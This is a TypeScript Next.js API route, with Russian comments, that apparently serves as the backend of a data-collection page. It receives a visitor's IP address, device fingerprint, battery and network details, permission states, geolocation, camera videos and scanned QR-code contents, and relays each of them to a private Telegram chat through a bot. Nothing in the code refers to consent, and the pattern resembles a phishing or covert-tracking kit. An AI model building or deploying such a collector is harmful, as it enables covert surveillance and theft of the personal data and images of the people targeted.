import { NextRequest, NextResponse } from "next/server";
import { Buffer } from "buffer";

// Читаем переменные окружения во время выполнения (runtime), а не на этапе инициализации модуля
// Это важно для serverless окружений типа Netlify
function getTelegramConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const apiBase = token ? `https://api.telegram.org/bot${token}` : "";
  
  // Логируем для диагностики (без чувствительных данных)
  if (!token || !chatId) {
    console.error("[Telegram API] Missing environment variables:", {
      hasToken: !!token,
      hasChatId: !!chatId,
      nodeEnv: process.env.NODE_ENV,
      // Показываем первые 4 символа токена для проверки (если есть)
      tokenPrefix: token ? `${token.substring(0, 4)}...` : "missing",
    });
  } else {
    console.log("[Telegram API] Configuration loaded successfully:", {
      hasToken: true,
      hasChatId: true,
      tokenPrefix: `${token.substring(0, 4)}...`,
      chatIdLength: chatId.length,
    });
  }
  
  return { token, chatId, apiBase };
}

enum MessageType {
  InitialSummary = "initial_summary",
  Video1 = "video1",
  Video2 = "video2",
  QrCode = "qr_code",
  VideoQrScan = "video_qr_scan",
  Geolocation = "geolocation",
}

export async function POST(req: NextRequest) {
  // Получаем конфигурацию во время выполнения запроса
  const { token: TELEGRAM_BOT_TOKEN, chatId: TELEGRAM_CHAT_ID, apiBase: TELEGRAM_API_BASE } = getTelegramConfig();
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    const errorMsg = "Telegram bot token or chat ID is not configured. Please check your environment variables in Netlify dashboard.";
    console.error(`[Telegram API] ${errorMsg}`, {
      envKeys: Object.keys(process.env).filter(k => k.includes("TELEGRAM")),
      nodeEnv: process.env.NODE_ENV,
    });
    return NextResponse.json(
      { 
        error: errorMsg,
        hint: "Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in Netlify environment variables (Site settings > Environment variables)"
      },
      { status: 500 }
    );
  }

  try {
    const contentType = req.headers.get("content-type") || "";
    let body: Record<string, any> = {};
    let uploadedVideo: File | null = null;

    if (contentType.includes("multipart/form-data")) {
      const formData = await req.formData();
      body = Object.fromEntries(formData.entries());
      const possibleVideo = formData.get("video");
      if (possibleVideo instanceof File) {
        uploadedVideo = possibleVideo;
      }
    } else {
      body = await req.json();
    }

    const messageType = body.messageType as MessageType | undefined;
    if (!messageType) {
      return NextResponse.json({ error: "messageType is required" }, { status: 400 });
    }

    const sessionId = typeof body.sessionId === "string" ? body.sessionId : undefined;
    const timestamp = typeof body.timestamp === "string" ? body.timestamp : undefined;
    const attemptRaw = body.attempt;
    const attemptNumber = typeof attemptRaw === "string" ? parseInt(attemptRaw, 10) : attemptRaw;
    const attemptValue = Number.isFinite(attemptNumber) ? attemptNumber : 1;

    const ipAddressHeader = req.headers.get("x-forwarded-for");
    const ipAddress = ipAddressHeader ? ipAddressHeader.split(",").map((ip) => ip.trim()).join(", ") : "Unavailable";
    const formattedTimestamp = timestamp ? new Date(timestamp).toLocaleString("ru-RU") : new Date().toLocaleString("ru-RU");
    const sessionPrefix = sessionId ? `[Сессия: \`${sessionId}\`]\n` : "";
    const attemptSuffix = attemptValue > 1 ? ` (попытка ${attemptValue})` : "";

    switch (messageType) {
      case MessageType.Geolocation: {
        const geo = body.geolocation;
        if (geo?.latitude && geo?.longitude) {
          await sendTelegramJson("sendLocation", {
            chat_id: TELEGRAM_CHAT_ID,
            latitude: geo.latitude,
            longitude: geo.longitude,
          }, TELEGRAM_API_BASE);
        } else {
          console.warn(`[Session: ${sessionId}] Geolocation message received, but coordinates are missing.`);
        }
        break;
      }

      case MessageType.InitialSummary: {
        const { clientInfo, networkInfo, deviceMemory, batteryInfo, permissionStatus, geolocation } = body;
        let summaryText = `${sessionPrefix}*Общая информация*\n\n`;
        summaryText += `*Время клиента:* ${formattedTimestamp}\n`;
        summaryText += `*IP:* \`${ipAddress}\`\n`;

        summaryText += "\n--- *Устройство* ---\n";
        if (clientInfo?.platform) summaryText += `*Платформа:* ${clientInfo.platform}\n`;
        if (clientInfo?.hardwareConcurrency) summaryText += `*Потоков CPU:* ${clientInfo.hardwareConcurrency}\n`;
        if (deviceMemory !== undefined && deviceMemory !== null) summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
        if (clientInfo?.screenWidth && clientInfo.screenHeight) summaryText += `*Экран:* ${clientInfo.screenWidth}x${clientInfo.screenHeight}\n`;
        if (clientInfo?.browserLanguage) summaryText += `*Язык браузера:* ${clientInfo.browserLanguage}\n`;

        summaryText += "\n--- *Сеть и датчики* ---\n";
        if (networkInfo?.effectiveType) summaryText += `*Тип сети:* ${networkInfo.effectiveType}\n`;
        if (networkInfo?.rtt !== undefined) summaryText += `*RTT:* ${networkInfo.rtt} мс\n`;
        if (networkInfo?.downlink !== undefined) summaryText += `*Downlink:* ${networkInfo.downlink} Мбит/с\n`;
        if (batteryInfo?.level !== undefined) {
          const level = typeof batteryInfo.level === "number" ? Math.round(batteryInfo.level * 100) : batteryInfo.level;
          summaryText += `*Батарея:* ${level}% ${batteryInfo?.charging ? "(заряжается)" : ""}\n`;
        }
        if (geolocation?.latitude && geolocation?.longitude) {
          summaryText += `*Гео:* ${geolocation.latitude.toFixed(4)}, ${geolocation.longitude.toFixed(4)}\n`;
        }

        summaryText += "\n--- *Разрешения* ---\n";
        if (permissionStatus?.geolocation) summaryText += `*Geo:* ${permissionStatus.geolocation}\n`;
        if (permissionStatus?.camera) summaryText += `*Camera:* ${permissionStatus.camera}\n`;
        if (permissionStatus?.microphone) summaryText += `*Mic:* ${permissionStatus.microphone}\n`;

        await sendTelegramJson("sendMessage", {
          chat_id: TELEGRAM_CHAT_ID,
          text: summaryText,
          parse_mode: "Markdown",
        }, TELEGRAM_API_BASE);
        break;
      }

      case MessageType.Video1:
      case MessageType.Video2:
      case MessageType.VideoQrScan: {
        const inlineBase64 =
          messageType === MessageType.Video1
            ? body.video1
            : messageType === MessageType.Video2
            ? body.video2
            : body.videoQrScan;

        const label =
          messageType === MessageType.Video1
            ? "Видео 1"
            : messageType === MessageType.Video2
            ? "Видео 2"
            : "Видео сканирования QR";

        const fileNamePrefix =
          messageType === MessageType.Video1
            ? "video1"
            : messageType === MessageType.Video2
            ? "video2"
            : "video_qr_scan";

        await sendVideoToTelegram({
          uploadedVideo,
          inlineBase64,
          fileName: `${fileNamePrefix}_${sessionId ?? "unknown"}_attempt${attemptValue}.mp4`,
          caption: `${sessionPrefix}--- *${label}*${attemptSuffix} (время: ${formattedTimestamp})`,
          chatId: TELEGRAM_CHAT_ID,
          apiBase: TELEGRAM_API_BASE,
        });
        break;
      }

      case MessageType.QrCode: {
        if (body.qrCodeData) {
          const qrMessage = `${sessionPrefix}--- *QR-код*${attemptSuffix} ---\n${body.qrCodeData}\n(время: ${formattedTimestamp})`;
          await sendTelegramJson("sendMessage", {
            chat_id: TELEGRAM_CHAT_ID,
            text: qrMessage,
            parse_mode: "Markdown",
          }, TELEGRAM_API_BASE);
        } else {
          console.warn(`[Session: ${sessionId}] QR code message received without payload.`);
        }
        break;
      }

      default:
        return NextResponse.json({ error: "Unknown message type" }, { status: 400 });
    }

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error?.message ?? "Internal server error" }, { status: 500 });
  }
}

async function sendTelegramJson(endpoint: string, payload: Record<string, unknown>, apiBase: string) {
  const url = `${apiBase}/${endpoint}`;
  console.log(`[Telegram API] Sending request to ${endpoint}`);
  
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const errorBody = await response.text();
    console.error(`[Telegram API] ${endpoint} failed:`, {
      status: response.status,
      statusText: response.statusText,
      error: errorBody,
    });
    throw new Error(`Telegram ${endpoint} error (${response.status}): ${errorBody}`);
  }
  
  console.log(`[Telegram API] ${endpoint} succeeded`);
  return response;
}

async function sendVideoToTelegram({
  uploadedVideo,
  inlineBase64,
  fileName,
  caption,
  chatId,
  apiBase,
}: {
  uploadedVideo: File | null;
  inlineBase64?: string;
  fileName: string;
  caption: string;
  chatId: string;
  apiBase: string;
}) {
  let videoBlob: Blob | null = uploadedVideo;

  if (!videoBlob && inlineBase64) {
    const base64Data = inlineBase64.replace(/^data:video\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");
    videoBlob = new Blob([buffer], { type: "video/webm" });
  }

  if (!videoBlob) {
    throw new Error("Video payload is missing");
  }

  const formData = new FormData();
  formData.append("chat_id", chatId);
  let finalFileName = fileName;
  const forcedExtension = videoBlob.type.includes("mp4") ? "mp4" : (videoBlob.type.includes("webm") ? "webm" : "");
  if (forcedExtension) {
    finalFileName = fileName.replace(/\.[^/.]+$/, `.${forcedExtension}`);
  }
  formData.append("video", videoBlob, finalFileName);
  formData.append("caption", caption);
  formData.append("parse_mode", "Markdown");

  console.log(`[Telegram API] Sending video: ${finalFileName} (${Math.round(videoBlob.size / 1024)} KB)`);
  
  const response = await fetch(`${apiBase}/sendVideo`, {
    method: "POST",
    body: formData,
  });

  if (!response.ok) {
    const errorBody = await response.text();
    console.error(`[Telegram API] sendVideo failed:`, {
      status: response.status,
      statusText: response.statusText,
      error: errorBody,
    });
    throw new Error(`Telegram sendVideo error (${response.status}): ${errorBody}`);
  }
  
  console.log(`[Telegram API] sendVideo succeeded`);
  return response;
}
